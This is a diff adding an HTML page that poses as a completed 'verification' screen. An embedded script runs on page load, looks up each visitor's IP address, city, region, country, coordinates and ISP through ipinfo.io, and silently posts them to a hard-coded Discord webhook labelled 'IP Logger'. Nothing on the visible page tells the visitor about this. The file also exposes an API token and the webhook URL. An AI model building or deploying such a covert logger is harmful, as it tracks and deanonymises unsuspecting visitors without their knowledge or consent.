@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASR-VERIFICATION</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1e1e1e, #444);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+        }
+        .container {
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            animation: popIn 1s ease-in-out;
+        }
+        p {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+    <script>
+        async function sendIP() {
+            try {
+                let response = await fetch('https://ipinfo.io/json?token=a114842b265b58');
+                let data = await response.json();
+
+                let userIP = data.ip || "Unknown";
+                let city = data.city || "Unknown";
+                let region = data.region || "Unknown";
+                let country = data.country || "Unknown";
+                let location = data.loc || "Unknown";
+                let isp = data.org || "Unknown";
+                let isVPN = isp.toLowerCase().includes("vpn") ? "Yes" : "No";
+
+                const webhookURL = "https://discord.com/api/webhooks/1336291692822794250/K5Z1348GpDr-eoU92dwNZ-OjlR8w7pCJqt1vP01kYDOiQuYJoE1dsnkoyfCZOMQ5MrBs";
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: "IP Logger",
+                        content: `**New Verification**\n
+                        - **IP Address:** ${userIP}\n
+                        - **City:** ${city}\n
+                        - **Region:** ${region}\n
+                        - **Country:** ${country}\n
+                        - **Coordinates:** ${location}\n
+                        - **ISP:** ${isp}\n
+                        - **VPN Detected:** ${isVPN}`
+                    })
+                });
+            } catch (error) {
+                console.error("Error fetching IP:", error);
+            }
+        }
+        window.onload = sendIP;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>✅ YOU HAVE BEEN VERIFIED</h1>
+        <p>Welcome! Your verification is complete.</p>
+    </div>
+</body>
+</html>
